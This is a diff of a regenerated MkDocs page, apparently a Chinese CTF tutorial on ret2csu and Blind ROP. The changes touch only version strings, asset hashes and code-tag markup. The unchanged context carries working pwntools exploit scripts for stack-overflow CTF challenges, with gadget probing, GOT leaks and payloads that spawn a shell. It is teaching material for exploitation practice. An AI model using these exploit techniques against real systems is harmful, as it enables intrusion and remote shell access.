@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -5396,7 +5396,7 @@
 <h2 id="ret2csu">ret2csu<a class="headerlink" href="#ret2csu" title="Permanent link">&para;</a></h2>
 <h3 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)</p>
-<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">00000000004005</span><span class="nf">C0</span> <span class="c">; void _libc_csu_init(void)</span>
+<div class="codehilite"><pre><span></span><code><span class="nl">.text:</span><span class="err">00000000004005</span><span class="nf">C0</span> <span class="c">; void _libc_csu_init(void)</span>
 <span class="nl">.text:</span><span class="err">00000000004005</span><span class="nf">C0</span>                 <span class="no">public</span> <span class="no">__libc_csu_init</span>
 <span class="nl">.text:</span><span class="err">00000000004005</span><span class="nf">C0</span> <span class="no">__libc_csu_init</span> <span class="no">proc</span> <span class="no">near</span>               <span class="c">; DATA XREF: _start+16o</span>
 <span class="nl">.text:</span><span class="err">00000000004005</span><span class="nf">C0</span>                 <span class="no">push</span>    <span class="no">r15</span>
@@ -5438,7 +5438,7 @@
 <span class="nl">.text:</span><span class="err">0000000000400622</span>                 <span class="nf">pop</span>     <span class="no">r15</span>
 <span class="nl">.text:</span><span class="err">0000000000400624</span>                 <span class="nf">retn</span>
 <span class="nl">.text:</span><span class="err">0000000000400624</span> <span class="nf">__libc_csu_init</span> <span class="no">endp</span>
-</pre></div>
+</code></pre></div>
 
 <p>这里我们可以利用以下几点</p>
 <ul>
@@ -5448,23 +5448,23 @@
 </ul>
 <h3 id="_2">示例<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <p>这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护</p>
-<div class="codehilite"><pre><span></span>➜  ret2__libc_csu_init git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec level5
+<div class="codehilite"><pre><span></span><code>➜  ret2__libc_csu_init git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec level5
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>程序为 64 位，开启了堆栈不可执行保护。</p>
 <p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>
-<div class="codehilite"><pre><span></span><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-80h]@1</span>
 
   <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。</p>
 <p><strong>注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是execve 来获取 shell。</strong></p>
@@ -5476,7 +5476,7 @@
 <li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。</li>
 </ul>
 <p>exp 如下</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 
 <span class="c1">#context.log_level = &#39;debug&#39;</span>
@@ -5533,7 +5533,7 @@
 <span class="c1">## execve(bss_base+8)</span>
 <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="_3">思考<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <h4 id="_4">改进<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
@@ -5549,7 +5549,7 @@
 <p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
 <h4 id="gadget">gadget<a class="headerlink" href="#gadget" title="Permanent link">&para;</a></h4>
 <p>其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数</p>
-<div class="codehilite"><pre><span></span>_init
+<div class="codehilite"><pre><span></span><code>_init
 _start
 call_gmon_start
 deregister_tm_clones
@@ -5559,7 +5559,7 @@ frame_dummy
 __libc_csu_init
 __libc_csu_fini
 _fini
-</pre></div>
+</code></pre></div>
 
 <p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
 <p>需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p>
@@ -5568,7 +5568,7 @@ _fini
 <li>利用中间部分的代码控制了rdx，rsi，edi。</li>
 </ul>
 <p>而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，<strong>可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在0x0000000000400621 处可以控制 rsi寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">5</span><span class="no">i</span> <span class="mi">0x000000000040061A</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">5</span><span class="no">i</span> <span class="mi">0x000000000040061A</span>
    <span class="err">0</span><span class="nf">x40061a</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">pop</span>    <span class="no">rbx</span>
    <span class="err">0</span><span class="nf">x40061b</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">pop</span>    <span class="no">rbp</span>
    <span class="err">0</span><span class="nf">x40061c</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">pop</span>    <span class="no">r12</span>
@@ -5615,7 +5615,7 @@ _fini
    <span class="err">0</span><span class="nl">x400625:</span>    <span class="nf">nop</span>
    <span class="err">0</span><span class="nl">x400626:</span>    <span class="nf">nop</span>    <span class="no">WORD</span> <span class="no">PTR</span> <span class="no">cs</span><span class="p">:[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
    <span class="err">0</span><span class="nf">x400630</span> <span class="err">&lt;</span><span class="no">__libc_csu_fini</span><span class="err">&gt;</span><span class="p">:</span>  <span class="no">repz</span> <span class="no">ret</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="_5">题目<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <ul>
@@ -5673,8 +5673,8 @@ _fini
 <p>直接从1暴力枚举即可，直到发现程序崩溃。</p>
 <h4 id="stack-reading">Stack Reading<a class="headerlink" href="#stack-reading" title="Permanent link">&para;</a></h4>
 <p>如下所示，这是目前经典的栈布局</p>
-<div class="codehilite"><pre><span></span>buffer|canary|saved fame pointer|saved returned address
-</pre></div>
+<div class="codehilite"><pre><span></span><code>buffer|canary|saved fame pointer|saved returned address
+</code></pre></div>
 
 <p>要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。</p>
 <p>其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。</p>
@@ -5684,12 +5684,12 @@ _fini
 <h4 id="blind-rop">Blind ROP<a class="headerlink" href="#blind-rop" title="Permanent link">&para;</a></h4>
 <h5 id="_13">基本思路<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h5>
 <p>最朴素的执行write函数的方法就是构造系统调用。</p>
-<div class="codehilite"><pre><span></span><span class="nf">pop</span> <span class="no">rdi</span><span class="c">; ret # socket</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">pop</span> <span class="no">rdi</span><span class="c">; ret # socket</span>
 <span class="nf">pop</span> <span class="no">rsi</span><span class="c">; ret # buffer</span>
 <span class="nf">pop</span> <span class="no">rdx</span><span class="c">; ret # length</span>
 <span class="nf">pop</span> <span class="no">rax</span><span class="c">; ret # write syscall number</span>
 <span class="nf">syscall</span>
-</pre></div>
+</code></pre></div>
 
 <p>但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。</p>
 <h6 id="brop-gadgets">BROP gadgets<a class="headerlink" href="#brop-gadgets" title="Permanent link">&para;</a></h6>
@@ -5699,8 +5699,8 @@ _fini
 <p>我们可以通过plt表来获取write的地址。</p>
 <h6 id="control-rdx">control rdx<a class="headerlink" href="#control-rdx" title="Permanent link">&para;</a></h6>
 <p>需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序</p>
-<div class="codehilite"><pre><span></span><span class="nf">pop</span> <span class="no">rdx</span><span class="c">; ret</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="nf">pop</span> <span class="no">rdx</span><span class="c">; ret</span>
+</code></pre></div>
 
 <p>这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。</p>
 <p>那么接下来的问题，我们就可以分为两项</p>
@@ -5819,8 +5819,8 @@ _fini
 <p>当然，我们也可以选择寻找puts函数。</p>
 <h6 id="putsplt">寻找puts@plt<a class="headerlink" href="#putsplt" title="Permanent link">&para;</a></h6>
 <p>寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下</p>
-<div class="codehilite"><pre><span></span>payload = &#39;A&#39;*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>payload = &#39;A&#39;*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
+</code></pre></div>
 
 <h4 id="_15">攻击总结<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
 <p>此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情</p>
@@ -5832,7 +5832,7 @@ _fini
 <h3 id="_16">例子<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
 <p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016的出题人失踪了</a> 为例。基本思路如下</p>
 <h4 id="_17">确定栈溢出长度<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">getbufferflow_length</span><span class="p">():</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">getbufferflow_length</span><span class="p">():</span>
     <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
@@ -5848,12 +5848,12 @@ _fini
         <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
             <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
             <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。</p>
 <h4 id="stop-gadgets_1">寻找 stop gadgets<a class="headerlink" href="#stop-gadgets_1" title="Permanent link">&para;</a></h4>
 <p>寻找过程如下</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
@@ -5868,15 +5868,15 @@ _fini
         <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
             <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
             <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址</p>
-<div class="codehilite"><pre><span></span>one success stop gadget addr: 0x4006b6
-</pre></div>
+<div class="codehilite"><pre><span></span><code>one success stop gadget addr: 0x4006b6
+</code></pre></div>
 
 <h4 id="brop-gadgets_1">识别brop gadgets<a class="headerlink" href="#brop-gadgets_1" title="Permanent link">&para;</a></h4>
 <p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
         <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
@@ -5922,16 +5922,16 @@ _fini
             <span class="nb">print</span> <span class="s1">&#39;success brop gadget: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">addr</span>
             <span class="k">break</span>
     <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>这样，我们基本得到了brop的gadgets地址0x4007ba</p>
 <h4 id="putsplt_1">确定puts@plt地址<a class="headerlink" href="#putsplt_1" title="Permanent link">&para;</a></h4>
 <p>根据上面，所说我们可以构造如下payload来进行获取</p>
-<div class="codehilite"><pre><span></span>payload = &#39;A&#39;*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>payload = &#39;A&#39;*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
+</code></pre></div>
 
 <p>具体函数如下</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
         <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
@@ -5950,12 +5950,12 @@ _fini
         <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
             <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
             <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
-</pre></div>
+</code></pre></div>
 
 <p>最后根据plt的结构，选择0x400560作为puts@plt</p>
 <h4 id="putsgot">泄露puts@got地址<a class="headerlink" href="#putsgot" title="Permanent link">&para;</a></h4>
 <p>在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下</p>
-<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
     <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
         <span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
@@ -5997,29 +5997,29 @@ _fini
     <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\x00'，因为puts是输出字符串，字符串是以'\x00'为终止符的。之后利用ida打开binary模式，首先在edit-&gt;segments-&gt;rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下</p>
-<div class="codehilite"><pre><span></span><span class="nl">seg000:</span><span class="err">0000000000400560</span>                 <span class="nf">db</span> <span class="mi">0</span><span class="no">FFh</span>
+<div class="codehilite"><pre><span></span><code><span class="nl">seg000:</span><span class="err">0000000000400560</span>                 <span class="nf">db</span> <span class="mi">0</span><span class="no">FFh</span>
 <span class="nl">seg000:</span><span class="err">0000000000400561</span>                 <span class="nf">db</span>  <span class="mi">25</span><span class="no">h</span> <span class="c">; %</span>
 <span class="nl">seg000:</span><span class="err">0000000000400562</span>                 <span class="nf">db</span> <span class="mi">0</span><span class="no">B2h</span> <span class="c">;</span>
 <span class="nl">seg000:</span><span class="err">0000000000400563</span>                 <span class="nf">db</span>  <span class="mi">0</span><span class="no">Ah</span>
 <span class="nl">seg000:</span><span class="err">0000000000400564</span>                 <span class="nf">db</span>  <span class="mi">20</span><span class="no">h</span>
 <span class="nl">seg000:</span><span class="err">0000000000400565</span>                 <span class="nf">db</span>    <span class="mi">0</span>
-</pre></div>
+</code></pre></div>
 
 <p>然后按下c,将此处的数据转换为汇编指令，如下</p>
-<div class="codehilite"><pre><span></span><span class="nl">seg000:</span><span class="err">0000000000400560</span> <span class="c">; ---------------------------------------------------------------------------</span>
+<div class="codehilite"><pre><span></span><code><span class="nl">seg000:</span><span class="err">0000000000400560</span> <span class="c">; ---------------------------------------------------------------------------</span>
 <span class="nl">seg000:</span><span class="err">0000000000400560</span>                 <span class="nf">jmp</span>     <span class="no">qword</span> <span class="no">ptr</span> <span class="no">cs</span><span class="p">:</span><span class="mi">601018</span><span class="no">h</span>
 <span class="nl">seg000:</span><span class="err">0000000000400566</span> <span class="c">; ---------------------------------------------------------------------------</span>
 <span class="nl">seg000:</span><span class="err">0000000000400566</span>                 <span class="nf">push</span>    <span class="mi">0</span>
 <span class="nl">seg000:</span><span class="err">000000000040056</span><span class="nf">B</span>                 <span class="no">jmp</span>     <span class="no">loc_400550</span>
 <span class="nl">seg000:</span><span class="err">000000000040056</span><span class="nf">B</span> <span class="c">; ---------------------------------------------------------------------------</span>
-</pre></div>
+</code></pre></div>
 
 <p>这说明，puts@got的地址为0x601018。</p>
 <h4 id="_18">程序利用<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="c1">##length = getbufferflow_length()</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##length = getbufferflow_length()</span>
 <span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
 <span class="c1">##stop_gadget = get_stop_addr(length)</span>
 <span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006b6</span>
@@ -6046,7 +6046,7 @@ _fini
     <span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="_19">参考阅读<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
 <ul>
@@ -6154,7 +6154,7 @@ _fini
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -6169,7 +6169,7 @@ _fini
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
